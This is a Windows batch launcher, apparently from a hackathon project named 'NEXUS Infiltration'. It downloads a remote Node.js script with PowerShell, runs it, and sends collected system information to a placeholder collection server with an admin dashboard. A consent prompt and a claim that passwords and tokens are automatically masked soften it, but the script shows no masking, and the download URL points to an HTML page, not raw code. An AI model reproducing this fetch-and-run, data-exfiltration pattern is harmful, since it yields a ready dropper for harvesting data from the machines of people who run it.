@echo off
title NEXUS Infiltration - One Click Runner
color 0A

echo.
echo ╔═══════════════════════════════════════════════════════════╗
echo ║                                                           ║
echo ║     ⚡ NEXUS INFILTRATION - One Click Runner             ║
echo ║                                                           ║
echo ║     Thunder Hackathon 3.0                                ║
echo ║                                                           ║
echo ╚═══════════════════════════════════════════════════════════╝
echo.

echo 📋 This tool will collect system information and send it to
echo    our central server for the hackathon demonstration.
echo.
echo 🔒 All sensitive data (passwords, keys, tokens) is AUTOMATICALLY MASKED
echo.

echo ⚠️  By continuing, you agree to share anonymous system data
echo    for the purpose of this hackathon evaluation.
echo.

choice /C YN /M "Continue"
if errorlevel 2 (
    echo ❌ Operation cancelled
    pause
    exit /b
)

echo.
echo 🚀 Starting NEXUS...

:: Check if Node.js is installed
where node >nul 2>nul
if %errorlevel% neq 0 (
    echo.
    echo ❌ Node.js is not installed!
    echo.
    echo 📥 Please install Node.js from: https://nodejs.org
    echo.
    echo    After installation, run this script again.
    echo.
    pause
    exit /b
)

:: Get Node.js version
for /f "delims=" %%i in ('node -v') do set NODE_VERSION=%%i
echo ✅ Node.js found: %NODE_VERSION%
echo.

:: Create temporary directory
set TEMP_DIR=%TEMP%\nexus-%RANDOM%
mkdir "%TEMP_DIR%" 2>nul
cd /d "%TEMP_DIR%"

:: Determine server URL
set SERVER_URL=https://your-railway-app.railway.app/api/collect
echo 🌐 Server: %SERVER_URL%
echo.

:: Download the tool
echo 📥 Downloading NEXUS tool...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/user-aditi/nexus-infiltration/blob/main/nexus-tool/nexus.js' -OutFile 'nexus.js'"

if %errorlevel% neq 0 (
    echo ❌ Failed to download tool
    cd /d %CD%
    rmdir /s /q "%TEMP_DIR%" 2>nul
    pause
    exit /b
)

echo ✅ Download complete
echo.

:: Run the tool
echo ⚡ Executing NEXUS...
echo.
echo ─────────────────────────────────────────────────────────────
node nexus.js --server %SERVER_URL% --no-interactive
echo ─────────────────────────────────────────────────────────────
echo.

:: Capture the exit code
set EXIT_CODE=%errorlevel%

:: Cleanup
cd /d %CD%
rmdir /s /q "%TEMP_DIR%" 2>nul

if %EXIT_CODE% equ 0 (
    echo.
    echo ✅ ✅ ✅ SUCCESS! ✅ ✅ ✅
    echo.
    echo 📊 Your system data has been sent to the server!
    echo.
    echo 🔐 Admin dashboard: https://your-railway-app.railway.app/admin
    echo.
) else (
    echo.
    echo ⚠️  Operation completed with warnings
    echo.
)

echo Press any key to exit...
pause >nul